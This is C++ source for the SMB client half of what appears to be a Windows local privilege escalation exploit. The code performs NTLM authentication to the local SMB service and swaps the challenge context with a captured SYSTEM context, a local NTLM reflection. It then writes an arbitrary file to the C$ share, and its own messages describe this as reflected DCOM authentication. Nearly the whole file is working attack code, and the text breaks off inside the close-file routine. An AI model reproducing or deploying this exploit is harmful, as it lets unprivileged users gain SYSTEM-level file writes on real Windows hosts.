#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "windows.h"
#include "stdio.h"
#include "winsock.h"
#include "sspi.h"
#include "SMBClient.h"

#define CHUNK_SIZE 10000

// global vars
extern wchar_t* destfname;
extern wchar_t* inputfname;
extern HANDLE event1;
extern HANDLE event2;
extern HANDLE event3;
extern char SystemContext[];
extern char UserContext[];

BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t*, wchar_t*,wchar_t *);
SOCKET ConnectSocket(const wchar_t* ipAddress, int port);
BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
int findNTLMBytes(char* bytes, int len);
BOOL SMBNegoProtocol(SOCKET s, char* recBuffer);
BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer);
BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID);
BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int* recBufferLen, CredHandle* hCred, struct _SecHandle* hcText);
BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int recBufferLen, CredHandle* hCred, struct _SecHandle* hcText);
BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path);
BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* fname);
BOOL SMB2WriteRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* infile, wchar_t* fname);
BOOL SMB2CloseFileRequest(SOCKET s, char* recBuffer, int& MessageID);
BOOL SMB2TreeDisconnect(SOCKET s, char* recBuffer, int& MessageID);

void SMBAuthenticatedFileWrite()
{
    SOCKET smbSocket = ConnectSocket(L"127.0.0.1", 445);
    DoAuthenticatedFileWriteSMB(smbSocket, (wchar_t*)L"\\\\127.0.0.1\\c$", (wchar_t*)destfname, (wchar_t *)inputfname);
    closesocket(smbSocket);
}


BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t *infile)
{
    BOOL ret = FALSE;
    int MessageID = 2;
    char recBuffer[DEFAULT_BUFLEN];
    SMBNegoProtocol(s, recBuffer);
    SMB2NegoProtocol(s, recBuffer);
    SMB2DoAuthentication(s, recBuffer, MessageID);
    if(!SMB2TreeConnect(s, recBuffer, MessageID, path))
        return ret;
    SMB2CreateFileRequest(s, recBuffer, MessageID, fname);
    if (!SMB2WriteRequest(s, recBuffer, MessageID, infile, fname))
        return ret;
    SMB2CloseFileRequest(s, recBuffer, MessageID);
    ret = SMB2TreeDisconnect(s, recBuffer, MessageID);
    return ret;
}

BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText)
{
    SECURITY_STATUS   ss;
    TimeStamp         Lifetime;
    SecBufferDesc     OutBuffDesc;
    SecBuffer         OutSecBuff;
    SecBufferDesc     InBuffDesc;
    SecBuffer         InSecBuff;
    ULONG             ContextAttributes;
    static PTCHAR     lpPackageName = (PTCHAR)L"NTLM";

    if (NULL == pIn)
    {
        ss = AcquireCredentialsHandleW(NULL, lpPackageName, SECPKG_CRED_OUTBOUND, (PVOID)0, NULL, NULL, NULL, hCred, &Lifetime);
        if (!(SEC_SUCCESS(ss))) {
            printf("[!] AcquireCredentialsHandleW failed with error code 0x%x\n", ss);
            return FALSE;
        }
    }
    OutBuffDesc.ulVersion = 0;
    OutBuffDesc.cBuffers = 1;
    OutBuffDesc.pBuffers = &OutSecBuff;
    OutSecBuff.cbBuffer = *pcbOut;
    OutSecBuff.BufferType = SECBUFFER_TOKEN;
    OutSecBuff.pvBuffer = pOut;
    if (pIn)
    {
        InBuffDesc.ulVersion = 0;
        InBuffDesc.cBuffers = 1;
        InBuffDesc.pBuffers = &InSecBuff;
        InSecBuff.cbBuffer = cbIn;
        InSecBuff.BufferType = SECBUFFER_TOKEN;
        InSecBuff.pvBuffer = pIn;
        ss = InitializeSecurityContextW(hCred, hcText, pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, &InBuffDesc, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    }
    else
        ss = InitializeSecurityContext(hCred, NULL, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, NULL, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    if (!SEC_SUCCESS(ss))
    {
        printf("[!] InitializeSecurityContext failed with error code 0x%x\n", ss);
        return FALSE;
    }
    if ((SEC_I_COMPLETE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss))
    {
        ss = CompleteAuthToken(hcText, &OutBuffDesc);
        if (!SEC_SUCCESS(ss))
        {
            printf("[!] CompleteAuthToken failed with error code 0x%x\n", ss);
            return FALSE;
        }

    }
    *pcbOut = OutSecBuff.cbBuffer;
    *pfDone = !((SEC_I_CONTINUE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss));
    return TRUE;
}

SOCKET ConnectSocket(const wchar_t* ipAddress, int port) {
    char ipAddress_a[20];
    char remotePort_a[12];
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    memset(remotePort_a, 0, 12);
    memset(ipAddress_a, 0, 20);
    wcstombs(ipAddress_a, ipAddress, 20);
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(ipAddress_a);
    clientService.sin_port = htons(port);
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"[!] ConnectSocket: connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    Sleep(1000);
    printf("[*] Connected to the SMB server with ip %s and port %d\n", ipAddress_a, port);
    return ConnectSocket;
}

int findNTLMBytes(char* bytes, int len)
{
    //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
    char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
    int pIdx = 0;
    int i;
    for (i = 0; i < len; i++) {
        if (bytes[i] == pattern[pIdx]) {
            pIdx = pIdx + 1;
            if (pIdx == 7) return (i - 6);
        }
        else {
            pIdx = 0;
        }
    }
    return -1;
}

BOOL SMBNegoProtocol(SOCKET s, char* recBuffer) {
    BOOL ret = TRUE;
    myshort slen;
    int len = 0, pid = 0;
    myshort ms;
    char c = 0;

    unsigned char smb_nego_protocol[] = \
        "\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x01\x48" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xac\x7b" \
        "\x00\x00\x00\x00\x00\x22\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e" \
        "\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00\x02\x53" \
        "\x4d\x42\x20\x32\x2e\x3f\x3f\x3f\x00";

    pid = GetCurrentProcessId();
    ms.i = pid;
    memcpy(&smb_nego_protocol[30], ms.buffer, 2);
    memcpy(slen.buffer, &smb_nego_protocol[2], 2);
    c = smb_nego_protocol[3];
    len = send(s, (char*)smb_nego_protocol, c + 4, 0);
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    return ret;
}

BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer) {
    BOOL ret = TRUE;
    int len = 0, pid = 0;
    char c = 0;
    myint mpid;

    unsigned char smb2_nego_protocol[] = \
        "\x00\x00\x00\x68\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" \
        "\x00\x00\x00\x00\x30\x7e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x24\x00\x02\x00\x01\x00\x00\x00\x01\x00\x00\x00" \
        "\xb3\x2a\x22\x3f\xcf\x5f\x43\x9c\xbb\x55\x8c\x98\x11\xd2\x5f\x1c" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x02\x02\x10\x02\x00";

    pid = GetCurrentProcessId();
    mpid.i = pid;
    memcpy(&smb2_nego_protocol[36], mpid.buffer, 4);
    c = smb2_nego_protocol[3];
    len = send(s, (char*)smb2_nego_protocol, c + 4, 0);
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    return ret;
}

BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID) {
    BOOL ret = TRUE;
    int recBufferLen = 0;
    CredHandle hCred;
    struct _SecHandle  hcText;

    SMB2AuthNtlmType1(s, recBuffer, MessageID, &recBufferLen, &hCred, &hcText);
    SMB2AuthNtlmType3(s, recBuffer, MessageID, recBufferLen, &hCred, &hcText);

    // here we receive the return status of the SMB authentication
    unsigned int* ntlmAuthStatus = (unsigned int*)(recBuffer + 12);
    if (*ntlmAuthStatus != 0) {
        printf("[!] SMB reflected DCOM authentication failed with status code 0x%x\n", *ntlmAuthStatus);
        ret = FALSE;
    }
    else {
        printf("[+] SMB reflected DCOM authentication succeeded!\n");
    }

    return ret;
}

BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
    BOOL ret = TRUE;
    usmb2_header s2h;
    usmb2_data s2d;
    myint mpid;
    BYTE pOutBuf[DEFAULT_BUFLEN];
    DWORD cbOut = DEFAULT_BUFLEN;
    BOOL fDone = FALSE;
    int plen = 0;
    myshort slen;
    myshort datalen;
    char netsess[4];
    int start = 2;
    char OutBuffer[1024];
    char finalPacket[DEFAULT_BUFLEN];

    if (!GenClientContext(NULL, 0, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
    {
        return(FALSE);
    }

    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    mpid.i = GetCurrentProcessId();
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

    datalen.i = cbOut;
    memcpy(&s2d.smb2_data.StructureSize, "\x19\x00", 2);
    memcpy(&s2d.smb2_data.Flags, "\x00", 1);
    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);

    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
    datalen.i = plen;
    slen.i = plen;

    memset(OutBuffer, 0, sizeof(OutBuffer));

    start = 0;
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    start += sizeof(s2h.buffer);
    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
    start += sizeof(s2d.buffer);
    memcpy(&OutBuffer[start], pOutBuf, cbOut);
    start = sizeof(s2h) + sizeof(s2d) + cbOut;
    memset(netsess, 0, 4);
    netsess[3] = slen.buffer[0];
    netsess[2] = slen.buffer[1];

    memcpy(finalPacket, netsess, 4);
    memcpy(finalPacket+4, OutBuffer, start);
    send(s, finalPacket, 4+start, 0);
    *recBufferLen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    return ret;
}

BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
    BOOL ret = TRUE;
    usmb2_header s2h;
    usmb2_data s2d;
    myint mpid;
    BYTE pOutBuf[DEFAULT_BUFLEN];
    DWORD cbOut = DEFAULT_BUFLEN;
    BOOL fDone = FALSE;
    int plen = 0;
    myshort slen;
    myshort datalen;
    char netsess[4];
    int start = 2;
    char ntlmtType2[1024];
    char OutBuffer[1024];
    unsigned char sessid[8];
    int pos = 0;
    char finalPacket[DEFAULT_BUFLEN];

    // here we do our magic for the context swapping
    pos = findNTLMBytes(recBuffer, recBufferLen);
    memcpy(&ntlmtType2[0], &recBuffer[pos], recBufferLen - pos);
    if (ntlmtType2[8] == 2)
    {
        memcpy(UserContext, &ntlmtType2[32], 8);
        WaitForSingleObject(event1, INFINITE);
        // for local auth reflection we don't really need to relay the entire packet 
        // swapping the context in the Reserved bytes with the SYSTEM context is enough
        memcpy(&ntlmtType2[32], SystemContext, 8);
        memcpy(&recBuffer[pos], &ntlmtType2[0], recBufferLen - pos);
        printf("[+] SMB Client Auth Context swapped with SYSTEM \n");
    }
    else {
        printf("[!] Authentication over SMB is not using NTLM. Exiting...\n");
        return FALSE;
    }
    if (!GenClientContext((BYTE*)ntlmtType2, recBufferLen - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
        exit(-1);
    SetEvent(event2);
    WaitForSingleObject(event3, INFINITE);

    memcpy(&sessid[0], &recBuffer[44], 8);
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x10\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    mpid.i = GetCurrentProcessId();
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memcpy(&s2d.smb2_data.StructureSize, "\x19\00", 2);
    memcpy(&s2d.smb2_data.Flags, "\00", 1);
    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    datalen.i = cbOut;
    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
    slen.i = plen;
    memcpy(&OutBuffer[0], slen.buffer, 4);
    start = 0;
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    start += sizeof(s2h.buffer);
    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
    start += sizeof(s2d.buffer);
    memcpy(&OutBuffer[start], pOutBuf, cbOut);
    start += cbOut;

    memset(netsess, 0, 4);
    netsess[3] = slen.buffer[0];
    netsess[2] = slen.buffer[1];

    memcpy(finalPacket, netsess, 4);
    memcpy(finalPacket + 4, OutBuffer, start);
    send(s, finalPacket, 4 + start, 0);
    recv(s, recBuffer, DEFAULT_BUFLEN, 0);

    return ret;
}

BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path){
    BOOL ret = TRUE;
    myint mpid;
    usmb2_header s2h;
    u_tree_connect_request_header trh;
    unsigned char sessid[8];
    char netsess[4];
    char finalPacket[DEFAULT_BUFLEN];

    trh.trh.flags = 0;
    trh.trh.structured_size = 9;
    trh.trh.path_offset = 0x48;
    trh.trh.path_len = wcslen(path) * 2;
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x03\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    mpid.i = GetCurrentProcessId();
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&sessid[0], &recBuffer[44], 8);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    
    memset(netsess, 0, 4);
    netsess[3] = sizeof(s2h.buffer) + sizeof(trh) + wcslen(path) * 2;

    memcpy(finalPacket, netsess, 4);
    memcpy(finalPacket + 4, s2h.buffer, sizeof(s2h.buffer));
    memcpy(finalPacket + 4 + sizeof(s2h.buffer), trh.buffer, sizeof(trh.buffer));
    memcpy(finalPacket + 4 + sizeof(s2h.buffer) + sizeof(trh.buffer), path, wcslen(path) * 2);
    send(s, finalPacket, 4 + sizeof(s2h.buffer) + sizeof(trh.buffer) + (wcslen(path) * 2), 0);

    // here we receive the return status of the Connect Tree from SMB
    recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* connectTreeStatus = (unsigned int*)(recBuffer + 12);
    if (*connectTreeStatus != 0) {
        printf("[!] SMB Connect Tree: %S failed with status code 0x%x\n", path, *connectTreeStatus);
        ret = FALSE;
    }
    else {
        printf("[+] SMB Connect Tree: %S  success\n", path);
    }
    return ret;
}

BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t *fname){
    BOOL ret = TRUE;
    myint mpid;
    myshort us;
    usmb2_header s2h;
    unsigned char sessid[8];
    char netsess[4];
    u_create_request create_req;
    char finalPacket[DEFAULT_BUFLEN];
    memcpy(&sessid[0], &recBuffer[44], 8);
    mpid.i = GetCurrentProcessId();
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x05\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memset(&create_req, 0, sizeof(create_req));
    create_req.cr.StructuredSize = 0x39;
    create_req.cr.SecurityFlags = '\x00';
    create_req.cr.RequestedOplockLevel = '\xff';
    create_req.cr.ImpersonationLevel = 2;
    memcpy(&create_req.cr.SmbCreateFlags[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&create_req.cr.Reserved[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&create_req.cr.DesiredAccess[0], "\x96\x01\x12\x00", 4);
    memcpy(&create_req.cr.FileAttribute[0], "\x80\x00\x00\x00", 4);
    memcpy(&create_req.cr.ShareAccess[0], "\x01\x00\x00\x00", 4);
    memcpy(&create_req.cr.CreateDisposition[0], "\x05\x00\x00\x00", 4);
    memcpy(&create_req.cr.CreateOptions[0], "\x60\x00\x00\x00", 4);
    create_req.cr.NameOffset = 0x78;
    create_req.cr.NameLength = wcslen(fname) * 2;
    create_req.cr.CreateContextsOffset = 0;
    create_req.cr.CreateContextsLength = 0;
    memset(netsess, 0, 4);
    us.i = sizeof(create_req) + sizeof(s2h) + (wcslen(fname) * 2);
    netsess[2] = us.buffer[1];
    netsess[3] = us.buffer[0];
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x05\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

    // send the final packet
    memcpy(finalPacket, netsess, 4);
    memcpy(finalPacket + 4, s2h.buffer, sizeof(s2h.buffer));
    memcpy(finalPacket + 4 + sizeof(s2h.buffer), create_req.buffer, sizeof(create_req.buffer));
    memcpy(finalPacket + 4 + sizeof(s2h.buffer) + sizeof(create_req.buffer), fname, wcslen(fname) * 2);
    send(s, finalPacket, 4 + sizeof(s2h.buffer) + sizeof(create_req.buffer) + (wcslen(fname) * 2), 0);

    // here we receive the return status of the Create Request File from SMB
    recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* createFileStatus = (unsigned int*)(recBuffer + 12);
    if (*createFileStatus != 0) {
        printf("[!] SMB Create Request File failed with status code 0x%x\n", *createFileStatus);
        ret = FALSE;
    }
    else {
        printf("[+] SMB Create Request File: %S success\n", fname);
    }

    return ret;
}

BOOL SMB2WriteRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* infile, wchar_t *fname) {
    BOOL ret = TRUE;
    myint mpid;
    myshort slen;
    usmb2_header s2h;
    unsigned char sessid[8];
    char netsess[4];    
    char fileid[16];
    unsigned int* writeResponseStatus;
    u_write_request write_req;
    FILE* fp;
    char* chunk = NULL;
    char* finalPacket = NULL;
    size_t nread;
    char cinfile[MAX_PATH];

    memcpy(&sessid[0], &recBuffer[44], 8);
    mpid.i = GetCurrentProcessId();
    memset(cinfile, 0, sizeof(cinfile));
    wcstombs(cinfile, infile, wcslen(infile));
    fp = fopen(cinfile, "rb");
    if (fp == NULL) {
        printf("[!] Unable to open input file: %s\n", cinfile);
        return FALSE;
    }
    write_req.wr.FileOffset = 0;
    memcpy(fileid, recBuffer + 132, 16);
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x09\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memset(&write_req, 0, sizeof(write_req));
    memcpy(&write_req.wr.fileid[0], fileid, 16);
    write_req.wr.FileOffset = 0L;
    write_req.wr.StructureSize = 0x31;
    write_req.wr.DataOffset = 0x70;
    chunk = (char*)malloc(CHUNK_SIZE);
    finalPacket = (char*)malloc(DEFAULT_BUFLEN * 16);
    while ((nread = fread(chunk, 1, CHUNK_SIZE, fp)) > 0) {
        write_req.wr.WriteLen = nread;
        s2h.smb2_header.MessageID = MessageID++;
        slen.i = sizeof(s2h.buffer) + sizeof(write_req) + nread;
        memset(netsess, 0, 4);
        netsess[3] = slen.buffer[0];
        netsess[2] = slen.buffer[1];
        memset(finalPacket, 0, DEFAULT_BUFLEN * 16);
        memcpy(finalPacket, netsess, 4);
        memcpy(finalPacket + 4, s2h.buffer, sizeof(s2h.buffer));
        memcpy(finalPacket + 4 + sizeof(s2h.buffer), write_req.buffer, 48);
        memcpy(finalPacket + 4 + sizeof(s2h.buffer) + 48, chunk, nread);
        send(s, finalPacket, 4 + sizeof(s2h.buffer) + 48 + nread, 0);
        // here we receive the return status of the Write Request from SMB
        recv(s, recBuffer, DEFAULT_BUFLEN, 0);
        writeResponseStatus = (unsigned int*)(recBuffer + 12);
        if (*writeResponseStatus != 0) {
            printf("[!] SMB Write Request failed with status code 0x%x\n", *writeResponseStatus);
            return FALSE;
        }
        write_req.wr.FileOffset = write_req.wr.FileOffset + nread;
    }
    printf("[+] SMB Write Request file: %S success\n", fname);
    free(chunk);
    free(finalPacket);
    return ret;
}

BOOL SMB2CloseFileRequest(SOCKET s, char* recBuffer, int& MessageID) {
    BOOL ret = TRUE;
    myint mpid;
    usmb2_header s2h;
    unsigned char sessid[8];
    char netsess[4];
    char finalPacket[DEFAULT_BUFLEN];
    char fileid[16];

    unsigned char close_file[] = \
        "\x18\x00\x01\x00\x00\x00\x00\x00\x10\x00\x00\x00\x0a\x00\x00\x00" \
        "\x09\x00\x00\x00\x0a\x00\x00\x00";
    
    memcpy(&sessid[0], &recBuffer[44], 8);
    mpid.i = GetCurrentProcessId();
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x06\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x30\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    s2h.smb2_header.MessageID = MessageID++;
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
